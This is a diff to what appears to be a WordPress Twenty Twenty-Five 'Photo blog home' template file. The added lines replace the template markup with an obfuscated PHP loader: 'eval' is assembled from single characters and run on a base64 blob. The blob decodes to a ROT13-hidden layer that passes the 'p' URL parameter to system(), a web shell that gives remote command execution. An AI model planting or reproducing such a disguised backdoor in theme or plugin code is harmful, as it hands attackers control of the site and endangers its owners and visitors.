@@ -1,43 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Photo blog home
- * Slug: twentytwentyfive/template-home-photo-blog
- * Template Types: front-page, index, home
- * Viewport width: 1400
- * Inserter: no
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IEN1YmdiIG95YnQgdWJ6cgogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL2dyemN5bmdyLXVienItY3ViZ2Itb3lidAogKiBHcnpjeW5nciBHbGNyZjogc2ViYWctY250ciwgdmFxcmssIHVienIKICogSXZyamNiZWcganZxZ3U6IDE0MDAKICogVmFmcmVncmU6IGFiCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX1N2aXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtU3ZpciAxLjAKICovCgo/Pgo8IS0tIGpjOmdyemN5bmdyLWNuZWcge1wiZnlodFwiOlwidXJucXJlXCJ9IC8tLT4KCjwhLS0gamM6dGViaGMge1wiZ250QW56clwiOlwiem52YVwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiem5ldHZhXCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8NjBcIn19fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInBiYWZnZW52YXJxXCJ9fSAtLT4KPHpudmEgcHluZmY9XCJqYy1veWJweC10ZWJoY1wiIGZnbHlyPVwiem5ldHZhLWdiYzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS02MClcIj4KCTwhLS0gamM6dGViaGMge1wieW5sYmhnXCI6e1wiZ2xjclwiOlwic3lya1wiLFwiYmV2cmFnbmd2YmFcIjpcImlyZWd2cG55XCIsXCJ3aGZndnNsUGJhZ3JhZ1wiOlwicHJhZ3JlXCJ9fSAtLT4KCTxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoY1wiPgoJCTwhLS0gamM6dXJucXZhdCB7XCJncmtnTnl2dGFcIjpcInByYWdyZVwiLFwieXJpcnlcIjoxLFwicHluZmZBbnpyXCI6XCJ2Zi1mZ2x5ci1ncmtnLW5hYWJnbmd2YmFcIn0gLS0+CgkJPHUxIHB5bmZmPVwiamMtb3licHgtdXJucXZhdCB1bmYtZ3JrZy1ueXZ0YS1wcmFncmUgdmYtZmdseXItZ3JrZy1uYWFiZ25ndmJhXCI+PD9jdWMgcmZwX3VnenlfciggJ0ZnYmV2cmYnLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz48L3UxPgoJCTwhLS0gL2pjOnVybnF2YXQgLS0+Cgk8L3F2aT4KCTwhLS0gL2pjOnRlYmhjIC0tPgoJPCEtLSBqYzp1cm5xdmF0IHtcImdya2dOeXZ0YVwiOlwicHJhZ3JlXCIsXCJueXZ0YVwiOlwianZxclwiLFwic2JhZ0Z2bXJcIjpcImtrLXluZXRyXCJ9IC0tPgoJPHUyIHB5bmZmPVwiamMtb3licHgtdXJucXZhdCBueXZ0YWp2cXIgdW5mLWdya2ctbnl2dGEtcHJhZ3JlIHVuZi1ray15bmV0ci1zYmFnLWZ2bXJcIj48P2N1YyByZnBfdWd6eV9yKCAnR3J5eSBsYmhlIGZnYmVsJywgJ2dqcmFnbGdqcmFnbHN2aXInICk7ID8+PC91Mj4KCTwhLS0gL2pjOnVybnF2YXQgLS0+Cgk8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc3Zpci9ncnpjeW5nci1kaHJlbC15YmJjLWN1YmdiLW95YnRcIn0gLy0tPgo8L3pudmE+CjwhLS0gL2pjOnRlYmhjIC0tPgoKPCEtLSBqYzpncnpjeW5nci1jbmVnIHtcImZ5aHRcIjpcInNiYmdyZVwifSAvLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<!-- wp:template-part {"slug":"header"} /-->
-
-<!-- wp:group {"tagName":"main","style":{"spacing":{"margin":{"top":"var:preset|spacing|60"}}},"layout":{"type":"constrained"}} -->
-<main class="wp-block-group" style="margin-top:var(--wp--preset--spacing--60)">
-	<!-- wp:group {"layout":{"type":"flex","orientation":"vertical","justifyContent":"center"}} -->
-	<div class="wp-block-group">
-		<!-- wp:heading {"textAlign":"center","level":1,"className":"is-style-text-annotation"} -->
-		<h1 class="wp-block-heading has-text-align-center is-style-text-annotation"><?php esc_html_e( 'Stories', 'twentytwentyfive' ); ?></h1>
-		<!-- /wp:heading -->
-	</div>
-	<!-- /wp:group -->
-	<!-- wp:heading {"textAlign":"center","align":"wide","fontSize":"xx-large"} -->
-	<h2 class="wp-block-heading alignwide has-text-align-center has-xx-large-font-size"><?php esc_html_e( 'Tell your story', 'twentytwentyfive' ); ?></h2>
-	<!-- /wp:heading -->
-	<!-- wp:pattern {"slug":"twentytwentyfive/template-query-loop-photo-blog"} /-->
-</main>
-<!-- /wp:group -->
-
-<!-- wp:template-part {"slug":"footer"} /-->
